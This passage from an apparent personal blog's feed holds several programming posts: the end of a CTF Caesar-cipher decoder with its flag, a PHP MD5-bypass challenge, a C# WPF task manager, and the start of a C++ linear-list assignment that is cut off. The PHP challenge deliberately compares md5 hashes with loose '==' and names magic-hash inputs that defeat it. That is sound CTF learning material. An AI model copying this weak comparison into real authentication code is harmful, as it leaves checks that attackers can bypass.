flag<span class="token operator">=</span><span class="token string">""</span>  <span class="token keyword">for</span> item <span class="token keyword">in</span> cipher:      m <span class="token operator">=</span> ord<span class="token punctuation">(</span>item<span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">#得到密文中每个字符的ascll值</span>      m +<span class="token operator">=</span> <span class="token function">shift</span>             <span class="token comment" spellcheck="true">#加上偏移量</span>      m %<span class="token operator">=</span> 128               <span class="token comment" spellcheck="true">#防止越界</span>      flag+<span class="token operator">=</span>chr<span class="token punctuation">(</span>m<span class="token punctuation">)</span>                 <span class="token function">shift</span> +<span class="token operator">=</span> 1  <span class="token keyword">return</span> flagshift<span class="token operator">=</span>5cipher<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token string">"密文："</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#输入密文</span>flag<span class="token operator">=</span>decode<span class="token punctuation">(</span>cipher,shift<span class="token punctuation">)</span>print<span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre></li><li>flag{Caesar_variation}<h4 id=""><a href="#" class="headerlink" title=""></a></h4></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bossXiang&#39;s blog</title>
      <link href="/2020/03/09/bossxiang-s-blog/"/>
      <url>/2020/03/09/bossxiang-s-blog/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h3><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$md51</span> <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token string">'240610708'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$md52</span> <span class="token operator">=</span> @md5<span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">))</span><span class="token punctuation">{</span>    if<span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token string">'QNKCDZO'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$md51</span><span class="token operator">==</span><span class="token variable">$md52</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"false!!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>?<span class="token operator">></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C#简易任务管理器</title>
      <link href="/2020/03/09/c-jian-yi-ren-wu-guan-li-qi/"/>
      <url>/2020/03/09/c-jian-yi-ren-wu-guan-li-qi/</url>
      
        <content type="html"><![CDATA[<h3 id="WPF完成简易任务管理器"><a href="#WPF完成简易任务管理器" class="headerlink" title="WPF完成简易任务管理器"></a>WPF完成简易任务管理器</h3><ul><li>实现进程信息的显示</li><li>结束进程</li><li>启动进程功能<a id="more"></a><h4 id="程序入口"><a href="#程序入口" class="headerlink" title="程序入口"></a>程序入口</h4></li></ul><h5 id="主窗体布局界面"><a href="#主窗体布局界面" class="headerlink" title="主窗体布局界面"></a>主窗体布局界面</h5><p><img src="http://q6py5t1v8.bkt.clouddn.com/%E7%AE%80%E6%98%93%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8%E4%B8%BB%E7%AA%97%E5%8F%A3%E5%B8%83%E5%B1%80%E7%95%8C%E9%9D%A2.png" alt="主窗体布局界面"></p><h5 id="主窗体布局代码-XML"><a href="#主窗体布局代码-XML" class="headerlink" title="主窗体布局代码(XML)"></a>主窗体布局代码(XML)</h5><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>Window x:Class<span class="token operator">=</span><span class="token string">"任务管理器作业.MainWindow"</span>        xmlns<span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/winfx/2006/xaml/presentation"</span>        xmlns:x<span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/winfx/2006/xaml"</span>        xmlns:d<span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/expression/blend/2008"</span>        xmlns:mc<span class="token operator">=</span><span class="token string">"http://schemas.openxmlformats.org/markup-compatibility/2006"</span>        xmlns:local<span class="token operator">=</span><span class="token string">"clr-namespace:任务管理器作业"</span>        mc:Ignorable<span class="token operator">=</span><span class="token string">"d"</span>        Title<span class="token operator">=</span><span class="token string">"任务管理器"</span> Height<span class="token operator">=</span><span class="token string">"450"</span> Width<span class="token operator">=</span><span class="token string">"800"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>Grid<span class="token operator">></span>        <span class="token operator">&lt;</span>Grid.RowDefinitions<span class="token operator">></span>            <span class="token operator">&lt;</span>RowDefinition Height<span class="token operator">=</span><span class="token string">"50"</span>/<span class="token operator">></span>            <span class="token operator">&lt;</span>RowDefinition Height<span class="token operator">=</span><span class="token string">"330"</span>/<span class="token operator">></span>            <span class="token operator">&lt;</span>RowDefinition /<span class="token operator">></span>        <span class="token operator">&lt;</span>/Grid.RowDefinitions<span class="token operator">></span>        <span class="token operator">&lt;</span>Label Grid.Row<span class="token operator">=</span><span class="token string">"0"</span> Content<span class="token operator">=</span><span class="token string">"启动、停止和观察进程"</span> FontSize<span class="token operator">=</span><span class="token string">"26"</span> FontFamily<span class="token operator">=</span><span class="token string">"华文新魏"</span> VerticalAlignment<span class="token operator">=</span><span class="token string">"Top"</span> HorizontalAlignment<span class="token operator">=</span><span class="token string">"Center"</span>/<span class="token operator">></span>        <span class="token operator">&lt;</span>DataGrid x:Name<span class="token operator">=</span><span class="token string">"dataGrid1"</span> Grid.Row<span class="token operator">=</span><span class="token string">"1"</span> Height<span class="token operator">=</span><span class="token string">"330"</span> Grid.RowSpan<span class="token operator">=</span><span class="token string">"2"</span> VerticalAlignment<span class="token operator">=</span><span class="token string">"Top"</span> AutoGenerateColumns<span class="token operator">=</span><span class="token string">"False"</span><span class="token operator">></span>            <span class="token operator">&lt;</span>DataGrid.Columns<span class="token operator">></span>                <span class="token operator">&lt;</span>DataGridTextColumn Binding<span class="token operator">=</span><span class="token string">"{Binding Id}"</span> ClipboardContentBinding<span class="token operator">=</span><span class="token string">"{x:Null}"</span> Header<span class="token operator">=</span><span class="token string">"进程ID"</span> Width<span class="token operator">=</span><span class="token string">"100"</span> FontSize<span class="token operator">=</span><span class="token string">"18"</span>/<span class="token operator">></span>                <span class="token operator">&lt;</span>DataGridTextColumn Binding<span class="token operator">=</span><span class="token string">"{Binding Name}"</span> ClipboardContentBinding<span class="token operator">=</span><span class="token string">"{x:Null}"</span> Header<span class="token operator">=</span><span class="token string">"进程名称"</span> Width<span class="token operator">=</span><span class="token string">"120"</span> FontSize<span class="token operator">=</span><span class="token string">"18"</span>/<span class="token operator">></span>                <span class="token operator">&lt;</span>DataGridTextColumn Binding<span class="token operator">=</span><span class="token string">"{Binding TotalMemory}"</span> ClipboardContentBinding<span class="token operator">=</span><span class="token string">"{x:Null}"</span> Header<span class="token operator">=</span><span class="token string">"占用内存"</span> Width<span class="token operator">=</span><span class="token string">"120"</span> FontSize<span class="token operator">=</span><span class="token string">"18"</span>/<span class="token operator">></span>                <span class="token operator">&lt;</span>DataGridTextColumn Binding<span class="token operator">=</span><span class="token string">"{Binding StartTime}"</span> ClipboardContentBinding<span class="token operator">=</span><span class="token string">"{x:Null}"</span> Header<span class="token operator">=</span><span class="token string">"启动时间"</span> Width<span class="token operator">=</span><span class="token string">"140"</span> FontSize<span class="token operator">=</span><span class="token string">"18"</span>/<span class="token operator">></span>                <span class="token operator">&lt;</span>DataGridTextColumn Binding<span class="token operator">=</span><span class="token string">"{Binding FileName}"</span> ClipboardContentBinding<span class="token operator">=</span><span class="token string">"{x:Null}"</span> Header<span class="token operator">=</span><span class="token string">"文件路径"</span> Width<span class="token operator">=</span><span class="token string">"Auto"</span> FontSize<span class="token operator">=</span><span class="token string">"18"</span>/<span class="token operator">></span>            <span class="token operator">&lt;</span>/DataGrid.Columns<span class="token operator">></span>        <span class="token operator">&lt;</span>/DataGrid<span class="token operator">></span>        <span class="token operator">&lt;</span>StackPanel Grid.Row<span class="token operator">=</span><span class="token string">"2"</span> HorizontalAlignment<span class="token operator">=</span><span class="token string">"Center"</span>  Height<span class="token operator">=</span><span class="token string">"50"</span> VerticalAlignment<span class="token operator">=</span><span class="token string">"Center"</span> Orientation<span class="token operator">=</span><span class="token string">"Horizontal"</span><span class="token operator">></span>            <span class="token operator">&lt;</span>Button Name<span class="token operator">=</span><span class="token string">"StartBtn"</span> FontSize<span class="token operator">=</span><span class="token string">"22"</span> FontFamily<span class="token operator">=</span><span class="token string">"华文新魏"</span> Background<span class="token operator">=</span><span class="token string">"AliceBlue"</span> Foreground<span class="token operator">=</span><span class="token string">"#FF0D0D0E"</span> Content<span class="token operator">=</span><span class="token string">"启动进程"</span> Margin<span class="token operator">=</span><span class="token string">"0,0,20,0"</span> Width<span class="token operator">=</span><span class="token string">"100"</span> Height<span class="token operator">=</span><span class="token string">"50"</span> VerticalAlignment<span class="token operator">=</span><span class="token string">"Top"</span> Click<span class="token operator">=</span><span class="token string">"StartBtn_Click"</span>/<span class="token operator">></span>            <span class="token operator">&lt;</span>Button Name<span class="token operator">=</span><span class="token string">"StopBtn"</span> FontSize<span class="token operator">=</span><span class="token string">"22"</span>  FontFamily<span class="token operator">=</span><span class="token string">"华文新魏"</span> Background<span class="token operator">=</span><span class="token string">"AliceBlue"</span> Foreground<span class="token operator">=</span><span class="token string">"#FF0C0315"</span> Content<span class="token operator">=</span><span class="token string">"结束进程"</span> Width<span class="token operator">=</span><span class="token string">"100"</span> Click<span class="token operator">=</span><span class="token string">"StopBtn_Click"</span>/<span class="token operator">></span>        <span class="token operator">&lt;</span>/StackPanel<span class="token operator">></span>    <span class="token operator">&lt;</span>/Grid<span class="token operator">></span><span class="token operator">&lt;</span>/Window<span class="token operator">></span></code></pre><h5 id="主窗口后台代码"><a href="#主窗口后台代码" class="headerlink" title="主窗口后台代码"></a>主窗口后台代码</h5><pre class=" language-bash"><code class="language-bash">using System<span class="token punctuation">;</span>using System.Collections.Generic<span class="token punctuation">;</span>using System.Diagnostics<span class="token punctuation">;</span>using System.Linq<span class="token punctuation">;</span>using System.Text<span class="token punctuation">;</span>using System.Threading.Tasks<span class="token punctuation">;</span>using System.Windows<span class="token punctuation">;</span>using System.Windows.Controls<span class="token punctuation">;</span>using System.Windows.Data<span class="token punctuation">;</span>using System.Windows.Documents<span class="token punctuation">;</span>using System.Windows.Input<span class="token punctuation">;</span>using System.Windows.Media<span class="token punctuation">;</span>using System.Windows.Media.Imaging<span class="token punctuation">;</span>using System.Windows.Navigation<span class="token punctuation">;</span>using System.Windows.Shapes<span class="token punctuation">;</span>using 任务管理器作业.PageOrWindow<span class="token punctuation">;</span>namespace 任务管理器作业<span class="token punctuation">{</span>    /// <span class="token operator">&lt;</span>summary<span class="token operator">></span>    /// MainWindow.xaml 的交互逻辑    /// <span class="token operator">&lt;</span>/summary<span class="token operator">></span>    public partial class MainWindow <span class="token keyword">:</span> Window    <span class="token punctuation">{</span>        public MainWindow<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            InitializeComponent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            RefreshProcessInfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        private void StartBtn_Click<span class="token punctuation">(</span>object sender, RoutedEventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Window w <span class="token operator">=</span> new StartNewProcess<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            w.Show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            RefreshProcessInfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        private void StopBtn_Click<span class="token punctuation">(</span>object sender, RoutedEventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            var duan <span class="token operator">=</span> dataGrid1.SelectedItem<span class="token punctuation">;</span>            try            <span class="token punctuation">{</span>                Data selectItem <span class="token operator">=</span> duan as Data<span class="token punctuation">;</span>                Process p <span class="token operator">=</span> Process.GetProcessById<span class="token punctuation">(</span>selectItem.Id<span class="token punctuation">)</span><span class="token punctuation">;</span>                p.Kill<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            catch <span class="token punctuation">(</span>Exception<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                MessageBox.Show<span class="token punctuation">(</span><span class="token string">"无法关闭"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            RefreshProcessInfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        List<span class="token operator">&lt;</span>Data<span class="token operator">></span> processList <span class="token operator">=</span> new List<span class="token operator">&lt;</span>Data<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        /// <span class="token operator">&lt;</span>summary<span class="token operator">></span>        ///         /// <span class="token operator">&lt;</span>/summary<span class="token operator">></span>        private void RefreshProcessInfo<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            dataGrid1.ItemsSource <span class="token operator">=</span> null<span class="token punctuation">;</span>            processList.Clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Process<span class="token punctuation">[</span><span class="token punctuation">]</span> process <span class="token operator">=</span> Process.GetProcesses<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            foreach<span class="token punctuation">(</span>Process p <span class="token keyword">in</span> process<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                Data duan_data <span class="token operator">=</span> new Data<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                duan_data.Id <span class="token operator">=</span> p.Id<span class="token punctuation">;</span>                duan_data.Name <span class="token operator">=</span> p.ProcessName<span class="token punctuation">;</span>                duan_data.TotalMemory <span class="token operator">=</span> p.WorkingSet64.ToString<span class="token punctuation">(</span><span class="token string">"{0,10:0}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                try                <span class="token punctuation">{</span>                    duan_data.StartTime <span class="token operator">=</span> p.StartTime.ToString<span class="token punctuation">(</span><span class="token string">"yyyy-M-d HH:mm:ss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                catch <span class="token punctuation">(</span>Exception<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    duan_data.StartTime <span class="token operator">=</span> <span class="token string">"无法获取"</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                try                <span class="token punctuation">{</span>                    duan_data.FileName <span class="token operator">=</span> p.MainModule.FileName<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                catch <span class="token punctuation">(</span>Exception<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    duan_data.FileName <span class="token operator">=</span> <span class="token string">"无法获取"</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                processList.Add<span class="token punctuation">(</span>duan_data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            dataGrid1.ItemsSource <span class="token operator">=</span> processList<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        public class Data        <span class="token punctuation">{</span>            //进程号            public int Id <span class="token punctuation">{</span> get<span class="token punctuation">;</span> <span class="token keyword">set</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>            //进程名            public string Name <span class="token punctuation">{</span> get<span class="token punctuation">;</span> <span class="token keyword">set</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>            //启动时间            public string StartTime <span class="token punctuation">{</span> get<span class="token punctuation">;</span> <span class="token keyword">set</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>            //占用内存            public string TotalMemory <span class="token punctuation">{</span> get<span class="token punctuation">;</span> <span class="token keyword">set</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>            //文件路径            public string FileName <span class="token punctuation">{</span> get<span class="token punctuation">;</span> <span class="token keyword">set</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="点击启动按钮时，弹出新窗口"><a href="#点击启动按钮时，弹出新窗口" class="headerlink" title="点击启动按钮时，弹出新窗口"></a>点击启动按钮时，弹出新窗口</h4><h5 id="新窗口布局压面如下"><a href="#新窗口布局压面如下" class="headerlink" title="新窗口布局压面如下"></a>新窗口布局压面如下</h5><p><img src="http://q6py5t1v8.bkt.clouddn.com/%E5%90%AF%E5%8A%A8%E4%BB%BB%E5%8A%A1%E7%AA%97%E5%8F%A3%E5%B8%83%E5%B1%80%E7%95%8C%E9%9D%A2.png" alt="启动任务的窗口布局"></p><h5 id="布局界面代码"><a href="#布局界面代码" class="headerlink" title="布局界面代码"></a>布局界面代码</h5><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>Window x:Class<span class="token operator">=</span><span class="token string">"任务管理器作业.PageOrWindow.StartNewProcess"</span>        xmlns<span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/winfx/2006/xaml/presentation"</span>        xmlns:x<span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/winfx/2006/xaml"</span>        xmlns:d<span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/expression/blend/2008"</span>        xmlns:mc<span class="token operator">=</span><span class="token string">"http://schemas.openxmlformats.org/markup-compatibility/2006"</span>        xmlns:local<span class="token operator">=</span><span class="token string">"clr-namespace:任务管理器作业.PageOrWindow"</span>        mc:Ignorable<span class="token operator">=</span><span class="token string">"d"</span>        Title<span class="token operator">=</span><span class="token string">"StartNewProcess"</span> Height<span class="token operator">=</span><span class="token string">"450"</span> Width<span class="token operator">=</span><span class="token string">"800"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>Grid<span class="token operator">></span>        <span class="token operator">&lt;</span>Grid.ColumnDefinitions<span class="token operator">></span>            <span class="token operator">&lt;</span>ColumnDefinition Width<span class="token operator">=</span><span class="token string">"150"</span>/<span class="token operator">></span>            <span class="token operator">&lt;</span>ColumnDefinition Width<span class="token operator">=</span><span class="token string">"500"</span>/<span class="token operator">></span>            <span class="token operator">&lt;</span>ColumnDefinition Width<span class="token operator">=</span><span class="token string">"150"</span>/<span class="token operator">></span>        <span class="token operator">&lt;</span>/Grid.ColumnDefinitions<span class="token operator">></span>        <span class="token operator">&lt;</span>Label Content<span class="token operator">=</span><span class="token string">"待启动进程名称："</span> Grid.Column<span class="token operator">=</span><span class="token string">"1"</span> FontSize<span class="token operator">=</span><span class="token string">"20"</span> HorizontalAlignment<span class="token operator">=</span><span class="token string">"Left"</span> Margin<span class="token operator">=</span><span class="token string">"21.6,107,0,0"</span> VerticalAlignment<span class="token operator">=</span><span class="token string">"Top"</span> Width<span class="token operator">=</span><span class="token string">"162"</span> Height<span class="token operator">=</span><span class="token string">"36"</span>/<span class="token operator">></span>        <span class="token operator">&lt;</span>TextBox Name<span class="token operator">=</span><span class="token string">"fileName"</span> Grid.Column<span class="token operator">=</span><span class="token string">"1"</span> HorizontalAlignment<span class="token operator">=</span><span class="token string">"Left"</span> FontSize<span class="token operator">=</span><span class="token string">"20"</span> Height<span class="token operator">=</span><span class="token string">"36"</span> Margin<span class="token operator">=</span><span class="token string">"237.6,107,0,0"</span> TextWrapping<span class="token operator">=</span><span class="token string">"Wrap"</span> Text<span class="token operator">=</span><span class="token string">""</span> VerticalAlignment<span class="token operator">=</span><span class="token string">"Top"</span> Width<span class="token operator">=</span><span class="token string">"171"</span>/<span class="token operator">></span>        <span class="token operator">&lt;</span>Button Name<span class="token operator">=</span><span class="token string">"Start"</span> FontSize<span class="token operator">=</span><span class="token string">"22"</span> Background<span class="token operator">=</span><span class="token string">"AliceBlue"</span>  Content<span class="token operator">=</span><span class="token string">"启动"</span> Grid.Column<span class="token operator">=</span><span class="token string">"1"</span> HorizontalAlignment<span class="token operator">=</span><span class="token string">"Left"</span> Margin<span class="token operator">=</span><span class="token string">"58.6,286,0,0"</span> VerticalAlignment<span class="token operator">=</span><span class="token string">"Top"</span> Width<span class="token operator">=</span><span class="token string">"111"</span> Height<span class="token operator">=</span><span class="token string">"43"</span> Click<span class="token operator">=</span><span class="token string">"Start_Click"</span>/<span class="token operator">></span>        <span class="token operator">&lt;</span>Button Name<span class="token operator">=</span><span class="token string">"Cancel"</span> FontSize<span class="token operator">=</span><span class="token string">"22"</span> Background<span class="token operator">=</span><span class="token string">"AliceBlue"</span>  Content<span class="token operator">=</span><span class="token string">"取消"</span> Grid.Column<span class="token operator">=</span><span class="token string">"1"</span> HorizontalAlignment<span class="token operator">=</span><span class="token string">"Left"</span> Margin<span class="token operator">=</span><span class="token string">"297.6,286,0,0"</span> VerticalAlignment<span class="token operator">=</span><span class="token string">"Top"</span> Width<span class="token operator">=</span><span class="token string">"111"</span> Height<span class="token operator">=</span><span class="token string">"43"</span> Click<span class="token operator">=</span><span class="token string">"Cancel_Click"</span>/<span class="token operator">></span>    <span class="token operator">&lt;</span>/Grid<span class="token operator">></span><span class="token operator">&lt;</span>/Window<span class="token operator">></span></code></pre><h5 id="窗口后台代码"><a href="#窗口后台代码" class="headerlink" title="窗口后台代码"></a>窗口后台代码</h5><pre class=" language-bash"><code class="language-bash">using System<span class="token punctuation">;</span>using System.Collections.Generic<span class="token punctuation">;</span>using System.Diagnostics<span class="token punctuation">;</span>using System.Linq<span class="token punctuation">;</span>using System.Text<span class="token punctuation">;</span>using System.Threading.Tasks<span class="token punctuation">;</span>using System.Windows<span class="token punctuation">;</span>using System.Windows.Controls<span class="token punctuation">;</span>using System.Windows.Data<span class="token punctuation">;</span>using System.Windows.Documents<span class="token punctuation">;</span>using System.Windows.Input<span class="token punctuation">;</span>using System.Windows.Media<span class="token punctuation">;</span>using System.Windows.Media.Imaging<span class="token punctuation">;</span>using System.Windows.Shapes<span class="token punctuation">;</span>namespace 任务管理器作业.PageOrWindow<span class="token punctuation">{</span>    /// <span class="token operator">&lt;</span>summary<span class="token operator">></span>    /// StartNewProcess.xaml 的交互逻辑    /// <span class="token operator">&lt;</span>/summary<span class="token operator">></span>    public partial class StartNewProcess <span class="token keyword">:</span> Window    <span class="token punctuation">{</span>        public StartNewProcess<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            InitializeComponent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        private void Start_Click<span class="token punctuation">(</span>object sender, RoutedEventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Process p <span class="token operator">=</span> new Process<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            p.StartInfo.FileName <span class="token operator">=</span> fileName.Text<span class="token punctuation">;</span>            p.StartInfo.WindowStyle <span class="token operator">=</span> ProcessWindowStyle.Normal<span class="token punctuation">;</span>            p.StartInfo.UseShellExecute <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            try            <span class="token punctuation">{</span>                p.Start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            catch <span class="token punctuation">(</span>Exception<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                MessageBox.Show<span class="token punctuation">(</span><span class="token string">"无法打开"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        private void Cancel_Click<span class="token punctuation">(</span>object sender, RoutedEventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> C# </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++</title>
      <link href="/2020/03/08/c-1/"/>
      <url>/2020/03/08/c-1/</url>
      
        <content type="html"><![CDATA[<h5 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h5><h2 id="数据结构线性表常见操作"><a href="#数据结构线性表常见操作" class="headerlink" title="数据结构线性表常见操作"></a>数据结构线性表常见操作</h2><pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">/*======线性表常见操作================作者：Duanqiao================version:1.1.1=================描述：数据结构实验作业==*/</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">define</span> MAXSIZE 100  </span><span class="token comment" spellcheck="true">//定义最大长度</span><span class="token comment" spellcheck="true">//const int MAXSIZE = 100;</span><span class="token macro property">#<span class="token directive keyword">define</span> ERROR -1;</span><span class="token comment" spellcheck="true">//const int ERROR = -1;</span><span class="token macro property">#<span class="token directive keyword">define</span> OK 1</span><span class="token comment" spellcheck="true">//const int OK = 1;</span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">int</span> Status<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">int</span> ElemType<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//定义表</span><span class="token keyword">struct</span> SqList<span class="token punctuation">{</span>    ElemType<span class="token operator">*</span> elem<span class="token punctuation">;</span>    <span class="token keyword">int</span> length<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//declear function</span>Status <span class="token function">InitList</span><span class="token punctuation">(</span>SqList<span class="token operator">&amp;</span> L<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//初始化表</span><span class="token keyword">void</span> <span class="token function">ClearList</span><span class="token punctuation">(</span>SqList <span class="token operator">&amp;</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span>SqList L<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">getLength</span><span class="token punctuation">(</span>SqList L<span class="token punctuation">)</span><span class="token punctuation">;</span>Status <span class="token function">GetElem</span><span class="token punctuation">(</span>SqList L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> ElemType<span class="token operator">&amp;</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>Status <span class="token function">getPrecursor</span><span class="token punctuation">(</span>SqList L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> ElemType<span class="token operator">&amp;</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>Status <span class="token function">getSuccessor</span><span class="token punctuation">(</span>SqList L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> ElemType<span class="token operator">&amp;</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>Status <span class="token function">ListInsert</span><span class="token punctuation">(</span>SqList <span class="token operator">&amp;</span>L<span class="token punctuation">,</span><span class="token keyword">int</span> i<span class="token punctuation">,</span>ElemType e<span class="token punctuation">)</span><span class="token punctuation">;</span>Status <span class="token function">ListDelete</span><span class="token punctuation">(</span>SqList<span class="token operator">&amp;</span> L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">display</span><span class="token punctuation">(</span>SqList L<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">TipsDisplay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//declare linear table</span>    SqList L<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//初始化</span>    <span class="token function">InitList</span><span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span>    ElemType 